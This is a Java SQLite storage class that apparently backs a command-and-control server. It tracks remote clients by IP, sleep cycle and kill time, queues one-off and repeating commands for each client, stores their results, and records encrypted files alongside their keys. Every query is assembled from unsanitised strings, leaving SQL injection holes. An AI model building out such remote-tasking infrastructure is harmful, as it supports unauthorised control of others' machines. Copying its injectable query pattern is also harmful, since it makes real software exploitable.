package DB;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;

/**
 * SQLite connector for hosting a local database on the server. Allows for quick
 * and organized data gathering between client, server, and operator.
 * 
 * @author Aidan Sprague
 * @version 07.22.2021
 */
public class Database {

    // Database data members:
    private static Connection connection;
    private static Statement statement;
    private static final int MAX_LENGTH = 500000;

    /**
     * Constructor for the class. Checks to see if the necessary classes can be
     * found before continuing; attempts to connect to the sql database given in the
     * parameter (an exception is thrown otherwise).
     * 
     * The query timeout is set to 30 seconds by default.
     * 
     * @param file The database file
     */
    public Database(File file) {
        try {
            // Ensure the jdbc is accessible
            Class.forName("org.sqlite.JDBC");

            // Create a connection to the database
            connection = DriverManager.getConnection("jdbc:sqlite:" + file.getPath().replace("\\", "/"));
            statement = connection.createStatement();
            statement.setQueryTimeout(30);

            // Setup tables if they do not already exist
            statement.executeUpdate("create table if not exists client_details(name text, ip text, creation real, last real, cc1 integer, cc2 integer, killtime real)");
            statement.executeUpdate("create table if not exists client_cmds(name text, type text, command text)");
            statement.executeUpdate("create table if not exists client_results(name text, datetime real, command text, result text, key text)");
            statement.executeUpdate("create table if not exists client_files(name text, filename text, key text)");
        } catch (Exception e) { e.printStackTrace(); }
    }

    /**
     * Secondary constructor only taking the name of the file.
     */
    public Database(String filename) { this(new File(filename)); }

    /**
     * Updates the client info.
     * 
     * @param p     an array containing the following: name, start time,
     *              server sleep cycle, time sleep cycle, killtime, endtime
     * @param ip    the ip address of the client
     * @param time  the current time
     */
    public void updateClient(String[] p, String ip, double time) throws Exception {

        String name = p[0];
        double start = Double.parseDouble(p[1]);
        int sleep1 = Integer.parseInt(p[2]);
        int sleep2 = Integer.parseInt(p[3]);
        double kill = Double.parseDouble(p[4]);

        statement.executeUpdate(String.format("delete from client_details where name='%s'", name));
        statement.executeUpdate(String.format("insert into client_details values('%s', '%s', %f, %f, %d, %d, %f)", name, ip, start, time, sleep1, sleep2, kill));
    }

    /**
     * Adds a command to the specified client's command table. Each command has
     * its own row in the table for easy mutating.
     * 
     * @param client    the name of the client
     * @param command   the command to add
     */
    public void addCommand(String client, String command) throws Exception {

        statement.executeUpdate(String.format("insert into client_cmds values('%s', 'single', '%s')", client, command));
    }

    /**
     * Adds an encrypted file's name and key to the file table.
     * 
     * @param client    the name of the client
     * @param filename  the name of the encrypted file
     * @param key       the encryption key to the file
     */
    public void addEncryptedFile(String client, String filename, String key) throws Exception {

        statement.executeUpdate(String.format("insert into client_files values('%s', '%s', '%s')", client, filename, key));
    }

    /**
     * Retrieve the key to a stored encrypted file for a specified client.
     * 
     * @param client    the name of the client
     * @param filename  the name of the encrypted file
     * 
     * @return  the encryption key for the file
     */
    public String getEncryptedFileKey(String client, String filename) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select key from client_files where name='%s' and filename='%s'", client, filename));
        rs.next();
        return rs.getString("key");
    }

    /**
     * Retrieve the list of encrypted files for a specified client.
     * 
     * @param client    the name of the client
     * 
     * @return  the list of encrypted files
     */
    public ArrayList<String> listEncryptedFiles(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select filename from client_files where name='%s'", client));
        ArrayList<String> files = new ArrayList<String>();
        while (rs.next()) 
            files.add(rs.getString("filename"));
        
        return files;
    }

    /**
     * Remove an encrypted file entry.
     * 
     * @param client    the name of the client
     * @param filename  the name of the encrypted file
     */
    public void removeEncryptedFile(String client, String filename) throws Exception {

        statement.executeUpdate(String.format("delete from client_files where name='%s' and filename='%s'", client, filename));
    }

    /**
     * Retrieve all commands for a given client.
     * 
     * @param client    the name of the client
     * 
     * @return an ArrayList containing each of the commands
     */
    public ArrayList<String> getCommands(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select command from client_cmds where name='%s' and type='single'", client));

        ArrayList<String> cmds = new ArrayList<>();
        while(rs.next()) 
            cmds.add(rs.getString("command"));
        
        return cmds;
    }

    /**
     * Retrieve the parameters from a client.
     * 
     * @param client    the name of the client
     * 
     * @return  an ArrayList containing the name, IP, creation, last connection,
     *          sleep cycles, and killtime of the client
     */
    public ArrayList<String> getClientInfo(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_details where name='%s'", client));
        if (rs.isClosed())
            return null;

        ArrayList<String> data = new ArrayList<>();
        rs.next();
        data.add(rs.getString("name"));
        data.add(rs.getString("ip"));
        data.add(rs.getString("creation"));
        data.add(rs.getString("last"));
        data.add(rs.getString("cc1"));
        data.add(rs.getString("cc2"));
        data.add(rs.getString("killtime"));

        return data;
    }

    /**
     * Update the name of the client in each table.
     * 
     * @param oldName   the old name of the client
     * @param newName   the new name of the client
     */
    public void changeName(String oldName, String newName) throws Exception {

        statement.executeUpdate(String.format("update client_details set name='%s' where name='%s'", newName, oldName));
        statement.executeUpdate(String.format("update client_cmds set name='%s' where name='%s'", newName, oldName));
        statement.executeUpdate(String.format("update client_results set name='%s' where name='%s'", newName, oldName));
        statement.executeUpdate(String.format("update client_files set name='%s' where name='%s'", newName, oldName));
    }

    /**
     * Retrieve all repeat commands for a given client.
     * 
     * @param client    the name of the client
     * 
     * @return an ArrayList containing each of the repeat commands
     */
    public ArrayList<String> getRepeats(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select command from client_cmds where name='%s' and type='repeat'", client));

        ArrayList<String> cmds = new ArrayList<>();
        while(rs.next()) 
            cmds.add(rs.getString("command"));
        
        return cmds;
    }

    /**
     * Removes a specified command from a given client's command table.
     * 
     * @param client    the name of the client
     * @param command   the command to remove
     */
    public void removeCommand(String client, String command) throws Exception {

        statement.executeUpdate(String.format("delete from client_cmds where name='%s' and type='single' and command='%s'", client, command));
    }

    /**
     * Removes ALL commands from a given client's command table.
     * 
     * @param client    the name of the client
     */
    public void removeAllCommands(String client) throws Exception {

        statement.executeUpdate(String.format("delete from client_cmds where name='%s' and type='single'", client));
    }

    /**
     * Removes a specified repeat command from a given client's repeat command table.
     * 
     * @param client    the name of the client
     * @param command   the repeat command to remove
     */
    public void removeRepeat(String client, String command) throws Exception {

        statement.executeUpdate(String.format("delete from client_cmds where name='%s' and type='repeat' and command='%s'", client, command));
    }

    /**
     * Removes ALL repeat commands from a given client's repeat command table.
     * 
     * @param client    the name of the client
     */
    public void removeAllRepeats(String client) throws Exception {

        statement.executeUpdate(String.format("delete from client_cmds where name='%s' and type='repeat'", client));
    }

    /**
     * Adds a repeat command to the specified client's repeat command table.
     * 
     * @param client    the name of the client
     * @param command   the repeat command to add
     */
    public void addRepeat(String client, String command) throws Exception {

        statement.executeUpdate(String.format("insert into client_cmds values('%s', 'repeat', '%s')", client, command));
    }

    /**
     * Add data (results) to the specified client.
     * 
     * @param client    the name of the client
     * @param datetime  the date and time (epoch time) of the results
     * @param commands  the commands performed to achieve this data
     * @param results   the results of the aformentioned commands
     * @param key       the key for the results
     */
    public void addResult(String client, double datetime, String commands, String results, String key) throws Exception {

        do {
            int endIndex = Math.min(results.length(), MAX_LENGTH);
            statement.executeUpdate(String.format("insert into client_results values('%s', %f, '%s', '%s', '%s')", client, datetime, commands, results.substring(0, endIndex), key));
            results = results.substring(endIndex);
        } while (results.length() > MAX_LENGTH);
    }

    /**
     * Retrieves the list of all known clients.
     * 
     * @return an ArrayList of every client name
     */
    public ArrayList<String> getClientList() throws Exception {

        ResultSet rs = statement.executeQuery("select name from client_details");
        if (rs.isClosed())
            return null;

        ArrayList<String> clients = new ArrayList<>(); 
        while(rs.next()) 
            clients.add(rs.getString("name"));
        
        return clients;
    }

    /**
     * Retrieve info about client results.
     * 
     * @param client    the name of the client
     * 
     * @return a pipe delimited string containing the first, last and count of results
     */
    public String getClientResultsInfo(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select datetime from client_results where name='%s' order by datetime desc limit 1", client));
        if (rs.isClosed() || !rs.next())
            return null;

        String last = rs.getString("datetime");

        rs = statement.executeQuery(String.format("select datetime from client_results where name='%s' order by datetime asc limit 1", client));
        if (rs.isClosed() || !rs.next())
            return null;

        String first = rs.getString("datetime");

        rs = statement.executeQuery(String.format("select count(*) from client_results where name='%s'", client));
        if (rs.isClosed() || !rs.next())
            return null;

        int count = rs.getInt("count(*)");

        return first + "|" + last + "|" + count;
    }

    /**
     * Retrieves the corresponding results given a date and time for a specified
     * client.
     * 
     * @param client    the name of the client
     * @param datetime  the date and time (epoch time) of the results
     * 
     * @return a pipe-separated string containing the datetime, commands, results,
     *         and key of the desired data
     */
    public String getClientResult(String client, double datetime) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_results where name='%s' and datetime=%f", client, datetime));
        if (rs.isClosed())
            return null;

        rs.next();
        String cmd = rs.getString("command");
        String key = rs.getString("key");

        if (cmd == null || key == null)
            return null;

        rs = statement.executeQuery(String.format("select * from client_results where name='%s' and datetime=%f and command='%s' and key='%s'", client, datetime, cmd, key));
        if (rs.isClosed())
            return null;

        String result = "";
        while(rs.next()) 
            result += rs.getString("result");
        
        return datetime + "|" + cmd + "|" + result + "|" + key;
    }

    /**
     * Retrieves the very first result for a specified client.
     * 
     * @param client    the name of the client
     * 
     * @return a pipe-separated string containing the datetime, commands, and results
     *         of the desired data
     */
    public String getClientFirstResult(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_results where name='%s' order by datetime asc limit 1", client));
        if (rs.isClosed())
            return null;

        rs.next();
        double datetime = rs.getDouble("datetime");
        String cmd = rs.getString("command");
        String key = rs.getString("key");

        if (cmd == null || key == null || datetime == 0)
            return null;

        rs = statement.executeQuery(String.format("select * from client_results where name='%s' and datetime=%f and command='%s' and key='%s'", client, datetime, cmd, key));
        if (rs.isClosed())
            return null;

        String result = "";
        while(rs.next()) 
            result += rs.getString("result");
        
        return datetime + "|" + cmd + "|" + result + "|" + key;
    }

    /**
     * Retrieves the very last result for a specified client.
     * 
     * @param client    the name of the client
     * 
     * @return a pipe-separated string containing the datetime, commands, and results
     *         of the desired data
     */
    public String getClientLastResult(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_results where name='%s' order by datetime desc limit 1", client));
        if (rs.isClosed())
            return null;

        rs.next();
        double datetime = rs.getDouble("datetime");
        String cmd = rs.getString("command");
        String key = rs.getString("key");

        if (cmd == null || key == null || datetime == 0)
            return null;

        rs = statement.executeQuery(String.format("select * from client_results where name='%s' and datetime=%f and command='%s' and key='%s'", client, datetime, cmd, key));
        if (rs.isClosed())
            return null;

        String result = "";
        while(rs.next()) 
            result += rs.getString("result");
        
        return datetime + "|" + cmd + "|" + result + "|" + key;
    }
    
    /**
     * Retrieve ALL data for a specified client.
     * 
     * @param client    the name of the client
     * 
     * @return an ArrayList containing pipe-separated strings with the datetime,
     *         commands, and results of the desired data
     */
    public ArrayList<String> getAllClientResults(String client) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_results where name='%s'", client));
        if (rs.isClosed() || !rs.next())
            return null;

        ArrayList<String> data = new ArrayList<>();
        double dt = rs.getDouble("datetime");
        String cmd = rs.getString("command");
        String res = rs.getString("result");
        String key = rs.getString("key");

        boolean hasNext = rs.next();
        if (!hasNext) {
            data.add(dt + "|" + cmd + "|" + res + "|" + key);
            return data;
        }

        while (hasNext)  {
            double newDt = rs.getDouble("datetime");
            String newCmd = rs.getString("command");
            String newRes = rs.getString("result");
            String newKey = rs.getString("key");

            if (newDt == dt && newCmd.equals(cmd) && newKey.equals(key)) {
                // "Old" variables are a piece of a multi-part result
                res += newRes;
            }
            else {
                // "Old" varaibles are a single-part result
                data.add(dt + "|" + cmd + "|" + res + "|" + key);
                res = newRes;
            }

            // Reset variables for next iteration
            dt = newDt;
            cmd = newCmd;
            key = newKey;

            hasNext = rs.next();
        }

        // Add the final result
        data.add(dt + "|" + cmd + "|" + res + "|" + key);
        
        return data;
    }

    /**
     * Retrieve all data within a range of datetimes for a specified client.
     * 
     * @param client    the name of the client 
     * @param start     the starting datetime (epoch time)
     * @param end       the ending datetime (epoch time)
     * 
     * @return an ArrayList containing pipe-separated strings with the datetime,
     *         commands, and results of the desired data
     */
    public ArrayList<String> getClientResultRange(String client, double start, double end) throws Exception {

        ResultSet rs = statement.executeQuery(String.format("select * from client_results where name='%s' and datetime between %f and %f", client, start, end));
        if (rs.isClosed() || !rs.next())
            return null;

        ArrayList<String> data = new ArrayList<>();
        double dt = rs.getDouble("datetime");
        String cmd = rs.getString("command");
        String res = rs.getString("result");
        String key = rs.getString("key");

        boolean hasNext = rs.next();
        if (!hasNext) {
            data.add(dt + "|" + cmd + "|" + res + "|" + key);
            return data;
        }

        while (hasNext)  {
            double newDt = rs.getDouble("datetime");
            String newCmd = rs.getString("command");
            String newRes = rs.getString("result");
            String newKey = rs.getString("key");

            if (newDt == dt && newCmd.equals(cmd) && newKey.equals(key)) {
                // "Old" variables are a piece of a multi-part result
                res += newRes;
            }
            else {
                // "Old" varaibles are a single-part result
                data.add(dt + "|" + cmd + "|" + res + "|" + key);
                res = newRes;
            }

            // Reset variables for next iteration
            dt = newDt;
            cmd = newCmd;
            key = newKey;

            hasNext = rs.next();
        }

        // Add the final result
        data.add(dt + "|" + cmd + "|" + res + "|" + key);
        
        return data;
    }

    /**
     * Removes all stored data from a specified client.
     * 
     * @param client    the name of the client
     */
    public void clearClientResults(String client) throws Exception {

        statement.executeUpdate(String.format("delete from client_results where name='%s'", client));
    }

    /**
     * Removes all stored data as well as the three tables (data, commands, repeats)
     * associated with a specified client.
     * 
     * @param client    the name of the client
     */
    public void removeClient(String client) throws Exception {

        statement.executeUpdate(String.format("delete from client_details where name='%s'", client));
        statement.executeUpdate(String.format("delete from client_cmds where name='%s'", client));
        statement.executeUpdate(String.format("delete from client_results where name='%s'", client));
        statement.executeUpdate(String.format("delete from client_files where name='%s'", client));
    }

    /**
     * Removes all stored data for EVERY client, effectively wiping the database.
     */
    public void removeAll() throws Exception {

        statement.executeUpdate("drop table if exists client_details");
        statement.executeUpdate("drop table if exists client_cmds");
        statement.executeUpdate("drop table if exists client_results");
        statement.executeUpdate("drop table if exists client_files");
    }
}
